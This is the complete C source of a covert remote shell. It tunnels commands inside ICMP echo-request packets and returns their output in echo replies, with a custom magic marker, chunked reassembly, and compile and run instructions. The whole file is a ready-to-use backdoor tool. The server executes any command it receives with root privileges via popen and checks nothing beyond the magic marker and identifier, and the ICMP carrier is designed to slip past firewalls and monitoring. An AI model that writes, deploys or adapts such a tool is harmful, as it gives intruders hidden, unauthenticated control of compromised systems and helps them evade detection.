/*
 * icmp_shell.c — ICMP covert channel remote shell
 *
 * Commands ride in ICMP echo-request payloads; output comes back in
 * echo-reply payloads.  Large outputs are split into numbered chunks
 * and reassembled in order by the client.
 *
 * Compile:
 *   gcc -O2 -Wall -Wextra -o icmp_shell icmp_shell.c
 *
 * Run (root required for raw sockets):
 *   sudo ./icmp_shell server
 *   sudo ./icmp_shell client <server_ip>
 *
 * Payload wire layout (immediately after the 8-byte ICMP header):
 *
 *   [0..3]   MAGIC   0xDE 0xAD 0xBE 0xEF   — identifies our traffic
 *   [4]      type    0x01=CMD  0x02=RESP
 *   [5..6]   seq     big-endian uint16
 *   -- TYPE_RESP only --
 *   [7..8]   chunk_idx    big-endian uint16
 *   [9..10]  chunk_total  big-endian uint16
 *   [11..]   payload data
 *   -- TYPE_CMD only --
 *   [7..]    command bytes (UTF-8, no NUL)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>

/* ── protocol constants ───────────────────────────────────────────────── */

static const uint8_t MAGIC[4] = {0xDE, 0xAD, 0xBE, 0xEF};

#define IDENT          0x4943u   /* 'IC' — distinguishes us from real pings */
#define TYPE_CMD       0x01u
#define TYPE_RESP      0x02u
#define ICMP_ECHO_REQ  8u
#define ICMP_ECHO_REP  0u
#define CHUNK_SIZE     1200u     /* bytes of output per ICMP packet */
#define MAX_CHUNKS     64u
#define OUTPUT_MAX     (CHUNK_SIZE * MAX_CHUNKS)   /* ~76 KB */
#define CMD_MAX        3800u
#define RECV_BUF       65536u

/* ── ICMP helpers ─────────────────────────────────────────────────────── */

static uint16_t icmp_checksum(const void *buf, size_t len)
{
    const uint16_t *p = (const uint16_t *)buf;
    uint32_t sum = 0;
    while (len > 1) { sum += *p++; len -= 2; }
    if (len) sum += *(const uint8_t *)p;
    sum  = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (uint16_t)~sum;
}

/* Build an ICMP packet into buf; return total length written. */
static size_t build_icmp(uint8_t *buf, uint8_t type, uint16_t id,
                          uint16_t seq, const uint8_t *payload, size_t plen)
{
    buf[0] = type;
    buf[1] = 0;
    buf[2] = buf[3] = 0;                   /* checksum placeholder */
    buf[4] = (uint8_t)(id  >> 8);
    buf[5] = (uint8_t)(id  & 0xFF);
    buf[6] = (uint8_t)(seq >> 8);
    buf[7] = (uint8_t)(seq & 0xFF);
    if (plen) memcpy(buf + 8, payload, plen);
    uint16_t csum = icmp_checksum(buf, 8 + plen);
    buf[2] = (uint8_t)(csum >> 8);
    buf[3] = (uint8_t)(csum & 0xFF);
    return 8 + plen;
}

/*
 * Parse the raw IP+ICMP packet received on a SOCK_RAW socket.
 * Fills type/id/seq/payload/plen; returns 1 on success, 0 on failure.
 */
static int parse_icmp(const uint8_t *pkt, size_t n,
                       uint8_t *type, uint16_t *id, uint16_t *seq,
                       const uint8_t **payload, size_t *plen)
{
    if (n < 28) return 0;
    size_t ihl = (size_t)(pkt[0] & 0x0F) << 2;
    if (n < ihl + 8) return 0;
    const uint8_t *icmp = pkt + ihl;
    *type    = icmp[0];
    *id      = (uint16_t)((icmp[4] << 8) | icmp[5]);
    *seq     = (uint16_t)((icmp[6] << 8) | icmp[7]);
    *payload = icmp + 8;
    *plen    = n - ihl - 8;
    return 1;
}

/* ── payload encode / decode ──────────────────────────────────────────── */

static size_t enc_cmd(uint8_t *out, uint16_t seq,
                       const char *cmd, size_t cmd_len)
{
    memcpy(out, MAGIC, 4);
    out[4] = TYPE_CMD;
    out[5] = (uint8_t)(seq >> 8);
    out[6] = (uint8_t)(seq & 0xFF);
    memcpy(out + 7, cmd, cmd_len);
    return 7 + cmd_len;
}

static size_t enc_resp(uint8_t *out, uint16_t seq, uint16_t idx, uint16_t total,
                        const uint8_t *data, size_t data_len)
{
    memcpy(out, MAGIC, 4);
    out[4]  = TYPE_RESP;
    out[5]  = (uint8_t)(seq   >> 8);
    out[6]  = (uint8_t)(seq   & 0xFF);
    out[7]  = (uint8_t)(idx   >> 8);
    out[8]  = (uint8_t)(idx   & 0xFF);
    out[9]  = (uint8_t)(total >> 8);
    out[10] = (uint8_t)(total & 0xFF);
    if (data_len) memcpy(out + 11, data, data_len);
    return 11 + data_len;
}

/*
 * Decode our custom payload.
 * Returns TYPE_CMD or TYPE_RESP on success, 0 on failure.
 * For CMD:  fills seq, data, data_len.
 * For RESP: fills seq, idx, total, data, data_len.
 */
static int dec_payload(const uint8_t *p, size_t n,
                        uint16_t *seq, uint16_t *idx, uint16_t *total,
                        const uint8_t **data, size_t *data_len)
{
    if (n < 7 || memcmp(p, MAGIC, 4) != 0) return 0;
    uint8_t t = p[4];
    *seq = (uint16_t)((p[5] << 8) | p[6]);
    if (t == TYPE_CMD) {
        *data     = p + 7;
        *data_len = n - 7;
        return TYPE_CMD;
    }
    if (t == TYPE_RESP && n >= 11) {
        *idx      = (uint16_t)((p[7] << 8) | p[8]);
        *total    = (uint16_t)((p[9] << 8) | p[10]);
        *data     = p + 11;
        *data_len = n - 11;
        return TYPE_RESP;
    }
    return 0;
}

/* ── command execution ────────────────────────────────────────────────── */

static uint8_t *run_cmd(const char *cmd, size_t *out_len)
{
    uint8_t *buf = (uint8_t *)malloc(OUTPUT_MAX + 1);
    if (!buf) { *out_len = 0; return NULL; }

    FILE *fp = popen(cmd, "r");
    if (!fp) {
        snprintf((char *)buf, OUTPUT_MAX, "(popen: %s)\n", strerror(errno));
        *out_len = strlen((char *)buf);
        return buf;
    }
    size_t n = fread(buf, 1, OUTPUT_MAX, fp);
    pclose(fp);
    if (n == 0) { memcpy(buf, "(no output)\n", 13); n = 12; }
    *out_len = n;
    return buf;
}

/* ── server ───────────────────────────────────────────────────────────── */

static void print_local_ip(void)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;
    struct sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_port   = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &a.sin_addr);
    if (connect(s, (struct sockaddr *)&a, sizeof a) == 0) {
        struct sockaddr_in local = {0};
        socklen_t len = sizeof local;
        if (getsockname(s, (struct sockaddr *)&local, &len) == 0) {
            char ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &local.sin_addr, ip, sizeof ip);
            printf("[*] Server IP: %s\n", ip);
        }
    }
    close(s);
}

static void do_server(void)
{
    int rfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (rfd < 0) { perror("socket"); exit(1); }

    struct timeval tv = { 1, 0 };
    setsockopt(rfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);

    print_local_ip();
    printf("[*] ICMP server — listening for echo requests (Ctrl-C to stop)\n");

    uint8_t pkt[RECV_BUF];
    uint8_t pbuf[CHUNK_SIZE + 64];
    uint8_t spkt[CHUNK_SIZE + 128];

    for (;;) {
        struct sockaddr_in src = {0};
        socklen_t src_len = sizeof src;
        ssize_t n = recvfrom(rfd, pkt, sizeof pkt, 0,
                              (struct sockaddr *)&src, &src_len);
        if (n < 0) continue;

        uint8_t icmp_type;
        uint16_t id, seq;
        const uint8_t *payload;
        size_t plen;
        if (!parse_icmp(pkt, (size_t)n, &icmp_type, &id, &seq, &payload, &plen))
            continue;
        if (icmp_type != ICMP_ECHO_REQ || id != IDENT) continue;

        uint16_t r_seq, idx, total;
        const uint8_t *data;
        size_t data_len;
        if (dec_payload(payload, plen, &r_seq, &idx, &total, &data, &data_len)
                != TYPE_CMD)
            continue;

        char cmd[CMD_MAX + 1];
        size_t cmd_len = data_len < CMD_MAX ? data_len : CMD_MAX;
        memcpy(cmd, data, cmd_len);
        cmd[cmd_len] = '\0';

        char src_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &src.sin_addr, src_str, sizeof src_str);
        printf("[+] %-16s seq=%-5u  %s\n", src_str, (unsigned)seq, cmd);
        fflush(stdout);

        size_t out_len;
        uint8_t *output = run_cmd(cmd, &out_len);
        if (!output) continue;

        uint16_t nchunks = (uint16_t)((out_len + CHUNK_SIZE - 1) / CHUNK_SIZE);
        if (nchunks == 0) nchunks = 1;

        int tfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (tfd < 0) { perror("tx socket"); free(output); continue; }

        size_t offset = 0;
        for (uint16_t ci = 0; ci < nchunks; ci++) {
            size_t clen = out_len - offset;
            if (clen > CHUNK_SIZE) clen = CHUNK_SIZE;
            size_t pload_len = enc_resp(pbuf, seq, ci, nchunks,
                                         output + offset, clen);
            size_t slen = build_icmp(spkt, ICMP_ECHO_REP, IDENT, seq,
                                      pbuf, pload_len);
            sendto(tfd, spkt, slen, 0, (struct sockaddr *)&src, sizeof src);
            offset += clen;
            usleep(5000);   /* 5 ms between chunks */
        }
        close(tfd);
        free(output);
    }
}

/* ── client ───────────────────────────────────────────────────────────── */

static void do_client(const char *server_ip)
{
    int tfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    int rfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (tfd < 0 || rfd < 0) { perror("socket"); exit(1); }

    struct timeval tv = { 0, 100000 };   /* 100 ms receive poll */
    setsockopt(rfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    if (inet_pton(AF_INET, server_ip, &dst.sin_addr) != 1) {
        fprintf(stderr, "bad IP address: %s\n", server_ip);
        exit(1);
    }

    printf("[*] ICMP shell → %s  (type 'exit' to quit)\n", server_ip);

    uint16_t seq = 0;
    char cmd_buf[CMD_MAX + 1];
    uint8_t pbuf[CMD_MAX + 32];
    uint8_t spkt[CMD_MAX + 64];
    uint8_t rpkt[RECV_BUF];

    uint8_t  *chunks[MAX_CHUNKS];
    size_t    clens[MAX_CHUNKS];

    for (;;) {
        printf("icmp> ");
        fflush(stdout);
        if (!fgets(cmd_buf, (int)sizeof cmd_buf, stdin)) break;

        size_t clen = strlen(cmd_buf);
        while (clen && (cmd_buf[clen-1] == '\n' || cmd_buf[clen-1] == '\r'))
            cmd_buf[--clen] = '\0';
        if (clen == 0) continue;
        if (!strcmp(cmd_buf, "exit") || !strcmp(cmd_buf, "quit")) break;

        seq++;

        size_t plen = enc_cmd(pbuf, seq, cmd_buf, clen);
        size_t slen = build_icmp(spkt, ICMP_ECHO_REQ, IDENT, seq, pbuf, plen);
        if (sendto(tfd, spkt, slen, 0, (struct sockaddr *)&dst, sizeof dst) < 0) {
            perror("sendto"); continue;
        }

        memset(chunks, 0, sizeof chunks);
        memset(clens,  0, sizeof clens);
        uint16_t total_chunks = 0;
        int got = 0;
        time_t deadline = time(NULL) + 6;

        while (time(NULL) < deadline) {
            struct sockaddr_in from = {0};
            socklen_t from_len = sizeof from;
            ssize_t n = recvfrom(rfd, rpkt, sizeof rpkt, 0,
                                  (struct sockaddr *)&from, &from_len);
            if (n < 0) {
                if (total_chunks && got == (int)total_chunks) break;
                continue;
            }
            if (from.sin_addr.s_addr != dst.sin_addr.s_addr) continue;

            uint8_t icmp_type;
            uint16_t id, r_seq;
            const uint8_t *payload;
            size_t plen2;
            if (!parse_icmp(rpkt, (size_t)n, &icmp_type, &id, &r_seq,
                             &payload, &plen2))
                continue;
            if (icmp_type != ICMP_ECHO_REP || id != IDENT || r_seq != seq)
                continue;

            uint16_t r_seq2, idx, total;
            const uint8_t *data;
            size_t data_len;
            if (dec_payload(payload, plen2, &r_seq2, &idx, &total,
                             &data, &data_len) != TYPE_RESP)
                continue;
            if (r_seq2 != seq || idx >= MAX_CHUNKS) continue;

            total_chunks = total;
            if (!chunks[idx] && data_len > 0) {
                chunks[idx] = (uint8_t *)malloc(data_len);
                if (chunks[idx]) {
                    memcpy(chunks[idx], data, data_len);
                    clens[idx] = data_len;
                    got++;
                }
            }
            if (got == (int)total_chunks) break;
        }

        if (!got) {
            printf("[!] No response.\n");
        } else {
            uint16_t print_total = total_chunks ? total_chunks : (uint16_t)got;
            for (uint16_t i = 0; i < print_total; i++) {
                if (chunks[i]) {
                    fwrite(chunks[i], 1, clens[i], stdout);
                    free(chunks[i]);
                    chunks[i] = NULL;
                }
            }
            fflush(stdout);
        }
    }

    printf("[*] Bye.\n");
    close(tfd);
    close(rfd);
}

/* ── main ─────────────────────────────────────────────────────────────── */

int main(int argc, char *argv[])
{
    if (argc < 2) goto usage;
    if (!strcmp(argv[1], "server")) {
        do_server();
        return 0;
    }
    if (!strcmp(argv[1], "client")) {
        if (argc < 3) { fprintf(stderr, "missing server IP\n"); goto usage; }
        do_client(argv[2]);
        return 0;
    }
usage:
    fprintf(stderr, "usage: %s server\n"
                    "       %s client <server_ip>\n", argv[0], argv[0]);
    return 1;
}
